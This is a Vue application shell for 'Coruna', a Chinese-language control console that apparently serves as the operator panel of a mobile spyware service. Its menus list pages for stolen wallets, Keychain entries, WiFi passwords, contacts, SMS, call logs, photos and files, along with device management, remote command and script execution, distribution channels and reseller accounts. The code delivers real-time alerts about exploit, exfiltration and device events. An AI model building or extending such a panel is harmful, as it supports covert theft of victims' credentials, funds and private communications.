<template>
  <el-container v-if="!isLoginPage" class="app-container">
    <el-aside width="220px" class="sidebar">
      <div class="logo">
        <h2>Coruna</h2>
        <p>管理控制后台</p>
      </div>
      <el-menu
        :default-active="activeMenu"
        :default-openeds="openedMenus"
        class="sidebar-menu"
        background-color="#1a1a2e"
        text-color="#cfd3dc"
        active-text-color="#409eff"
        router
      >
        <el-menu-item index="/dashboard">
          <el-icon><DataAnalysis /></el-icon>
          <span>仪表盘</span>
        </el-menu-item>
        <el-menu-item index="/devices">
          <el-icon><Iphone /></el-icon>
          <span>设备管理</span>
        </el-menu-item>
        <el-sub-menu index="exfil-group">
          <template #title>
            <el-icon><FolderOpened /></el-icon>
            <span>数据窃取</span>
          </template>
          <el-menu-item index="/exfil">全部数据</el-menu-item>
          <el-menu-item index="/wallets">数字钱包</el-menu-item>
          <el-menu-item index="/exfil/keychain">Keychain</el-menu-item>
          <el-menu-item index="/exfil/wifi">WiFi密码</el-menu-item>
          <el-menu-item index="/exfil/contacts">通讯录</el-menu-item>
          <el-menu-item index="/exfil/sms">短信记录</el-menu-item>
          <el-menu-item index="/exfil/calls">通话记录</el-menu-item>
          <el-menu-item index="/exfil/photos">照片管理</el-menu-item>
          <el-menu-item index="/exfil/files">文件浏览器</el-menu-item>
        </el-sub-menu>
        <el-menu-item index="/channels">
          <el-icon><Connection /></el-icon>
          <span>渠道管理</span>
        </el-menu-item>
        <el-menu-item index="/templates">
          <el-icon><DocumentCopy /></el-icon>
          <span>模板管理</span>
        </el-menu-item>
        <el-sub-menu index="cmd-group">
          <template #title>
            <el-icon><Promotion /></el-icon>
            <span>命令执行</span>
          </template>
          <el-menu-item index="/commands">命令历史</el-menu-item>
          <el-menu-item index="/scripts">脚本管理</el-menu-item>
        </el-sub-menu>
        <el-menu-item v-if="isAdmin" index="/users">
          <el-icon><User /></el-icon>
          <span>用户管理</span>
        </el-menu-item>
        <el-menu-item v-if="isAdmin" index="/agents">
          <el-icon><Avatar /></el-icon>
          <span>代理商管理</span>
        </el-menu-item>
        <el-sub-menu index="sys-group">
          <template #title>
            <el-icon><Setting /></el-icon>
            <span>系统管理</span>
          </template>
          <el-menu-item index="/logs">访问日志</el-menu-item>
          <el-menu-item index="/audit">审计日志</el-menu-item>
          <el-menu-item index="/notifications">通知中心</el-menu-item>
          <el-menu-item index="/settings">系统设置</el-menu-item>
        </el-sub-menu>
        <el-menu-item index="/profile">
          <el-icon><UserFilled /></el-icon>
          <span>个人资料</span>
        </el-menu-item>
      </el-menu>
    </el-aside>
    <el-container>
      <el-header class="header">
        <div class="header-left">
          <el-text type="info" size="small">{{ currentPageTitle }}</el-text>
        </div>
        <div class="header-right">
          <el-dropdown trigger="click">
            <span class="user-info">
              <el-avatar :size="32" style="background:#409eff">
                <el-icon><User /></el-icon>
              </el-avatar>
              <span class="username">{{ user?.username }}</span>
              <el-tag v-if="isAdmin" type="danger" size="small" effect="plain">管理员</el-tag>
              <el-icon><ArrowDown /></el-icon>
            </span>
            <template #dropdown>
              <el-dropdown-menu>
                <el-dropdown-item disabled>
                  角色：{{ user?.role === 'admin' ? '管理员' : '操作员' }}
                </el-dropdown-item>
                <el-dropdown-item @click="goProfile">
                  <el-icon><User /></el-icon>
                  <span>个人中心</span>
                </el-dropdown-item>
                <el-dropdown-item divided @click="handleLogout">
                  <el-icon><SwitchButton /></el-icon>
                  <span>退出登录</span>
                </el-dropdown-item>
              </el-dropdown-menu>
            </template>
          </el-dropdown>
        </div>
      </el-header>
      <el-main class="main-content">
        <router-view v-slot="{ Component }">
          <transition name="fade" mode="out-in">
            <component :is="Component" />
          </transition>
        </router-view>
      </el-main>
    </el-container>
  </el-container>
  <router-view v-else />
</template>

<script setup>
import { computed, onBeforeUnmount, onMounted, watch } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import { ElMessage, ElNotification } from 'element-plus'
import { useAuthStore } from './stores/auth'
import axios from './utils/axios'

const route = useRoute()
const router = useRouter()
const authStore = useAuthStore()

const user = computed(() => authStore.user)
const isAdmin = computed(() => user.value?.role === 'admin')
const isLoginPage = computed(() => route.path === '/login')

const pageTitleMap = {
  '/dashboard': '仪表盘',
  '/devices': '设备列表',
  '/channels': '渠道管理',
  '/templates': '模板管理',
  '/exfil': '窃取数据总览',
  '/wallets': '数字钱包',
  '/exfil/keychain': 'Keychain 查看器',
  '/exfil/wifi': 'WiFi 密码',
  '/exfil/contacts': '通讯录',
  '/exfil/sms': '短信记录',
  '/exfil/calls': '通话记录',
  '/exfil/photos': '照片管理',
  '/exfil/files': '文件浏览器',
  '/commands': '命令历史',
  '/scripts': '脚本管理',
  '/logs': '访问日志',
  '/audit': '审计日志',
  '/notifications': '通知中心',
  '/users': '用户管理',
  '/agents': '代理商管理',
  '/settings': '系统设置',
  '/profile': '个人资料'
}

const currentPageTitle = computed(() => {
  if (route.path.startsWith('/devices/')) return '设备详情'
  return pageTitleMap[route.path] || 'Coruna'
})

const activeMenu = computed(() => {
  const path = route.path
  if (path.startsWith('/devices/')) return '/devices'
  if (path.startsWith('/exfil/')) return path
  if (path === '/') return '/dashboard'
  return path
})

const openedMenus = computed(() => {
  const path = route.path
  const opened = []
  if (path.startsWith('/exfil') || path === '/wallets') opened.push('exfil-group')
  if (path === '/commands' || path === '/scripts') opened.push('cmd-group')
  if (['/logs', '/audit', '/notifications', '/settings'].includes(path)) opened.push('sys-group')
  return opened
})

function goProfile() {
  router.push('/profile')
}

function handleLogout() {
  authStore.logout()
  router.push('/login')
}

const LS_NOTIFY_KEY = 'notify_enabled'
const LS_PAGE_TOAST_KEY = 'page_toast_enabled'

let sseSource = null
let sseReconnectTimer = null
let sseReconnectDelay = 1000
let sseTokenSnapshot = null
let visibilityListenerBound = false

const recentPageNotifications = new Map()

function trimUuid(uuid) {
  if (!uuid) return ''
  if (uuid.length <= 10) return uuid
  return uuid.slice(0, 10) + '...'
}

function dedupKeyForNotification(payload) {
  if (!payload) return null
  if (typeof payload.id === 'number') return 'id:' + payload.id
  const title = (payload.title || '').toString()
  const desc = (payload.message || payload.description || '').toString()
  const dev = (payload.related_device_uuid || '').toString()
  if (!title && !desc) return null
  let h = 0
  const s = title + '|' + desc + '|' + dev + '|' + (payload.category || payload.type || '')
  for (let i = 0; i < s.length; i++) {
    h = ((h << 5) - h + s.charCodeAt(i)) | 0
  }
  return 'hash:' + h
}

function isDuplicateNotification(payload) {
  const key = dedupKeyForNotification(payload)
  if (!key) return false
  const now = Date.now()
  const prev = recentPageNotifications.get(key)
  if (prev && (now - prev) < 120000) return true
  recentPageNotifications.set(key, now)
  if (recentPageNotifications.size > 200) {
    const cutoff = now - 180000
    for (const [k, t] of Array.from(recentPageNotifications.entries())) {
      if (t < cutoff) recentPageNotifications.delete(k)
    }
  }
  return false
}

function mapNotificationType(payload) {
  const cat = String(payload.type || payload.category || 'info').toLowerCase()
  if (cat.includes('error') || cat.includes('alert') || cat.includes('critical') || cat.includes('danger')) return 'error'
  if (cat.includes('warn') || cat.includes('exploit') || cat.includes('security')) return 'warning'
  if (cat.includes('success') || cat.includes('online') || cat.includes('back') || cat.includes('ok')) return 'success'
  if (cat.includes('device')) return 'warning'
  if (cat.includes('exfil')) return 'warning'
  return 'info'
}

function mapSseToNotification(evtData) {
  if (!evtData) return evtData
  return {
    id: evtData.id || null,
    title: evtData.title || '',
    description: evtData.description || evtData.message || '',
    type: evtData.type || evtData.category || 'info',
    read: false,
    created_at: evtData.created_at || evtData.timestamp || new Date().toISOString(),
    related_device_uuid: evtData.related_device_uuid || null,
    related_resource_type: evtData.related_resource_type || null,
    related_resource_id: evtData.related_resource_id || null,
  }
}

function triggerPageFloatingNotification(payload) {
  if (!payload) return
  const toastEnabled = localStorage.getItem(LS_PAGE_TOAST_KEY)
  if (toastEnabled === 'false') return
  if (isDuplicateNotification(payload)) return
  const title = payload.title || 'Coruna 通知'
  const rawBody = (payload.description || payload.message || '').toString()
  const body = rawBody
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>')
  const device = payload.related_device_uuid
  const deviceHtml = device
    ? `<div style="margin-top:6px;font-size:12px;color:#909399;">设备: <code style="background:#f4f4f5;padding:1px 6px;border-radius:4px;">${trimUuid(device)}</code></div>`
    : ''
  const duration = Math.max(5000, Math.min(15000, rawBody.length * 22 + 5000))
  try {
    ElNotification({
      title: title,
      message: body + deviceHtml,
      type: mapNotificationType(payload),
      dangerouslyUseHTMLString: true,
      position: 'bottom-right',
      duration: duration,
      offset: 24,
      showClose: true,
      customClass: 'coruna-toast coruna-toast-' + (payload.type || payload.category || 'info'),
      onClick: () => {
        try {
          if (payload.related_device_uuid) {
            router.push('/devices').catch(() => {})
          } else {
            router.push('/notifications').catch(() => {})
          }
          window.focus()
        } catch (_) {}
      },
    })
  } catch (err) {
    console.warn('[Notify] ElNotification 弹出失败:', err)
  }
}

function triggerBrowserNotification(payload) {
  const enabled = localStorage.getItem(LS_NOTIFY_KEY) === 'true'
  if (!enabled) return
  if (!('Notification' in window)) return
  if (Notification.permission !== 'granted') return
  try {
    const title = payload.title || 'Coruna 通知'
    const bodyText = (payload.description || payload.message || '').replace(/\n/g, '  ').slice(0, 200)
    const n = new Notification(title, {
      body: bodyText,
      tag: 'coruna-' + (payload.related_device_uuid || ('evt-' + Date.now())),
    })
    n.onclick = () => {
      window.focus()
      try {
        if (payload.related_device_uuid) {
          router.push('/devices').catch(() => {})
        } else {
          router.push('/notifications').catch(() => {})
        }
      } catch (_) {}
    }
    setTimeout(() => n && n.close && n.close(), 7000)
  } catch (_) {}
}

function clearSSE() {
  if (sseReconnectTimer) {
    clearTimeout(sseReconnectTimer)
    sseReconnectTimer = null
  }
  if (sseSource) {
    try { sseSource.close() } catch (_) {}
    sseSource = null
  }
}

let sseConsecutiveFailures = 0
const SSE_MAX_CONSECUTIVE_FAILURES = 3

async function preflightSSE(url) {
  // ============================================================
  // Phase 1: HEAD 优先（FastAPI 后端有了 notification_stream_head，只返回头，不占资源）
  // ============================================================
  let fallbackToGet = false
  const ctrl1 = new AbortController()
  const to1 = setTimeout(() => ctrl1.abort(), 6000)
  try {
    const res = await fetch(url, {
      method: 'HEAD',
      signal: ctrl1.signal,
      headers: { 'Accept': 'text/event-stream', 'Cache-Control': 'no-cache' }
    })
    clearTimeout(to1)
    const status = res.status
    const ct = (res.headers.get('content-type') || '').toLowerCase()
    if (status < 400) {
      return { ok: true, status, contentType: ct, statusText: res.statusText, preview: '', error: null }
    }
    // HEAD 明确不支持 / 路由不存在 / 未实现 → 降级 GET
    fallbackToGet = (status === 404 || status === 405 || status === 501)
    if (!fallbackToGet) {
      return { ok: false, status, contentType: ct, statusText: res.statusText, preview: '', error: null }
    }
  } catch (_err) {
    // HEAD 层网络错（跨域 / 代理拒绝）→ 也降级 GET
    clearTimeout(to1)
    fallbackToGet = true
  }

  // ============================================================
  // Phase 2: 降级 GET（兜底：真的发一次 SSE 握手）
  // ============================================================
  const ctrl2 = new AbortController()
  const to2 = setTimeout(() => ctrl2.abort(), 9000)
  try {
    const res = await fetch(url, {
      method: 'GET',
      signal: ctrl2.signal,
      headers: { 'Accept': 'text/event-stream', 'Cache-Control': 'no-cache' }
    })
    const status = res.status
    const ct = (res.headers.get('content-type') || '').toLowerCase()
    let preview = ''
    try {
      if (res.body && typeof res.body.getReader === 'function') {
        const reader = res.body.getReader()
        const x = await Promise.race([
          reader.read(),
          new Promise((_, rj) => setTimeout(() => rj(new Error('PREVIEW_TIMEOUT')), 1600))
        ]).catch(() => null)
        if (x && x.value) preview = new TextDecoder('utf-8').decode(x.value.slice(0, 240))
        try { reader.releaseLock() } catch (_) {}
      }
    } catch (_) {}
    clearTimeout(to2)
    if (status >= 400) {
      return { ok: false, status, contentType: ct, statusText: res.statusText, preview, error: null }
    }
    if (ct && !ct.includes('text/event-stream') && preview.length > 0
        && !preview.includes('event:') && !preview.includes('data:')) {
      return { ok: false, status, contentType: ct, statusText: res.statusText, preview, error: 'SSE_BAD_CONTENT' }
    }
    return { ok: true, status, contentType: ct, statusText: res.statusText, preview, error: null }
  } catch (err) {
    clearTimeout(to2)
    const isAbort = err?.name === 'AbortError' || /PREVIEW_TIMEOUT|aborted/i.test(err?.message || '')
    if (isAbort) {
      // 9s 超时 / 预览超时：说明后端在 hold 长连接，是正常 SSE 行为 → 放行
      return { ok: true, status: 200, contentType: 'text/event-stream (pending)', statusText: '', preview: '', error: null }
    }
    return { ok: false, status: 0, contentType: '', statusText: '', preview: '', error: err?.message || String(err) }
  }
}

function scheduleSSEReconnect(extraMsg = '') {
  if (sseReconnectTimer) return
  clearSSE()
  const token = authStore.token || localStorage.getItem('token') || sseTokenSnapshot
  if (!token) return
  sseConsecutiveFailures += 1
  if (sseConsecutiveFailures >= SSE_MAX_CONSECUTIVE_FAILURES) {
    try {
      ElMessage.error(`[实时通知] 连续失败 ${sseConsecutiveFailures} 次，已停止重连。${extraMsg} 请刷新页面或重新登录后再试。`)
    } catch (_) { console.error('[SSE] ElMessage not available:', _) }
    return
  }
  sseReconnectTimer = setTimeout(() => {
    sseReconnectTimer = null
    sseReconnectDelay = Math.min(sseReconnectDelay * 2, 32000)
    connectSSE()
  }, sseReconnectDelay)
}

async function connectSSE() {
  clearSSE()
  const token = authStore.token || localStorage.getItem('token') || ''
  if (!token) return
  sseTokenSnapshot = token
  const url = `/api/notifications/stream?token=${encodeURIComponent(token)}`
  const pre = await preflightSSE(url)
  if (!pre.ok) {
    let reason = ''
    if (pre.status === 401) reason = '登录已过期（401）'
    else if (pre.status === 403) reason = '权限不足（403）'
    else if (pre.status === 404) reason = 'SSE 路由不存在（404）'
    else if (pre.status >= 500) reason = `服务端错误（${pre.status}）`
    else if (pre.status === 0) reason = `网络不通：${pre.error || '连接失败'}`
    else if (pre.error === 'SSE_BAD_CONTENT') reason = `响应内容不是 SSE 格式（content-type=${pre.contentType || '(空)'}`
    else if (pre.contentType && !pre.contentType.includes('text/event-stream')) reason = `响应 MIME 错误：${pre.contentType || '(空)'}（应为 text/event-stream）`
    else if (pre.status !== 200) reason = `状态码非 200（${pre.status}）`
    const msg = `[实时通知] 预检失败：${reason}`
    console.warn(msg, pre)
    scheduleSSEReconnect(`（${reason}）`)
    return
  }
  sseConsecutiveFailures = 0
  try {
    sseSource = new EventSource(url, { withCredentials: false })
    sseSource.addEventListener('connected', () => {
      console.info('[SSE] Connected to notification stream')
      sseReconnectDelay = 1000
      sseConsecutiveFailures = 0
    })
    sseSource.addEventListener('notification', (e) => {
      try {
        const data = JSON.parse(e.data)
        const mapped = mapSseToNotification(data)
        window.dispatchEvent(new CustomEvent('coruna-notification', { detail: mapped }))
        window.dispatchEvent(new CustomEvent('coruna-unread-changed', { detail: mapped }))
        triggerPageFloatingNotification(mapped)
        triggerBrowserNotification(mapped)
      } catch (err) {
        console.warn('[SSE] parse notification failed:', err)
      }
    })
    sseSource.addEventListener('heartbeat', () => {})
    sseSource.onerror = () => {
      console.warn('[SSE] Connection error, scheduling reconnect in', sseReconnectDelay, 'ms')
      scheduleSSEReconnect()
    }
  } catch (e) {
    console.warn('[SSE] Failed to init:', e?.message)
    scheduleSSEReconnect(`（初始化失败：${e?.message || '未知错误'}）`)
  }
}

function handleCorunaNotification(_evt) {
  // 实际处理在 connectSSE 中直接调用 triggerPage/Browser 通知，此处仅兼容其他事件分发
}

function bindVisibilityListener() {
  if (visibilityListenerBound) return
  visibilityListenerBound = true
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
      const token = authStore.token || localStorage.getItem('token') || sseTokenSnapshot
      if (token && !sseSource) connectSSE()
    }
  })
}

onMounted(() => {
  const hasToken = !!(authStore.token || localStorage.getItem('token'))
  if (hasToken) {
    authStore.getMe().catch(() => {})
    if (!sseSource) connectSSE()
  }
  window.addEventListener('coruna-notification', handleCorunaNotification)
  bindVisibilityListener()
})

onBeforeUnmount(() => {
  clearSSE()
  window.removeEventListener('coruna-notification', handleCorunaNotification)
  recentPageNotifications.clear()
})

watch(() => authStore.token, (newVal) => {
  clearSSE()
  sseTokenSnapshot = newVal || null
  sseReconnectDelay = 1000
  if (newVal) connectSSE()
})
</script>

<style scoped>
.app-container {
  height: 100vh;
}

.sidebar {
  background: #1a1a2e;
  color: #fff;
  overflow: hidden;
}

.logo {
  padding: 20px 16px;
  text-align: center;
  border-bottom: 1px solid #2d2d4a;
}

.logo h2 {
  margin: 0;
  font-size: 22px;
  font-weight: 700;
  color: #ffffff;
  letter-spacing: 2px;
}

.logo p {
  margin: 6px 0 0;
  font-size: 12px;
  color: #8a8aab;
}

.sidebar-menu {
  border-right: none;
  height: calc(100vh - 92px);
  overflow-y: auto;
}

.sidebar-menu :deep(.el-menu-item),
.sidebar-menu :deep(.el-sub-menu__title) {
  color: #cfd3dc !important;
  background-color: #1a1a2e !important;
  transition: all 0.2s ease;
  height: 46px;
  line-height: 46px;
}

.sidebar-menu :deep(.el-menu-item:hover),
.sidebar-menu :deep(.el-sub-menu__title:hover) {
  background-color: #2a2a4a !important;
  color: #ffffff !important;
  border-left: 3px solid #409eff;
  padding-left: 17px !important;
}

.sidebar-menu :deep(.el-menu-item.is-active) {
  background-color: #25325c !important;
  color: #409eff !important;
  border-left: 3px solid #409eff;
  padding-left: 17px !important;
  font-weight: 600;
}

.sidebar-menu :deep(.el-sub-menu .el-menu) {
  background-color: #141428 !important;
}

.sidebar-menu :deep(.el-sub-menu .el-menu-item) {
  background-color: #141428 !important;
}

.sidebar-menu :deep(.el-sub-menu.is-active > .el-sub-menu__title) {
  color: #ffffff !important;
  background-color: #23233f !important;
}

.header {
  background: #ffffff;
  border-bottom: 1px solid #e6e6e6;
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 0 24px;
  box-shadow: 0 1px 4px rgba(0, 0, 0, 0.04);
}

.header-left {
  display: flex;
  align-items: center;
}

.header-right {
  display: flex;
  align-items: center;
}

.user-info {
  display: flex;
  align-items: center;
  gap: 10px;
  cursor: pointer;
  padding: 4px 8px;
  border-radius: 6px;
  transition: background 0.2s;
}

.user-info:hover {
  background: #f5f7fa;
}

.username {
  font-size: 14px;
  color: #303133;
  font-weight: 500;
}

.main-content {
  padding: 20px;
  background: #f5f7fa;
  overflow-y: auto;
}

.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.2s ease;
}

.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
</style>
